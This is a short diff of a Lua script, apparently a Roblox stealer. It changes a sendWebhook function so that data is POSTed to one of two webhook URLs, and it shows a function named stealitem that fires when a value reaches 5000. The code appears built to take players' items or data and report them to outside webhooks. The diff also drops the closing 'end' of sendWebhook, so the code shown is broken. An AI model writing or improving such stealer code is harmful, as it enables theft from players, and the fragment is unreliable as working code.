@@ -91,23 +91,13 @@ local function sendWebhook()
     })
 
     request({
-        Url = Webhook,
+        Url = Webhook or Webhook1,
         Method = "POST",
         Headers = {
             ["Content-Type"] = "application/json"
         },
         Body = data
     })
-
-    request({
-        Url = Webhook1,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = data
-    })
-end
 
 function stealitem()
     if result >= 5000 then
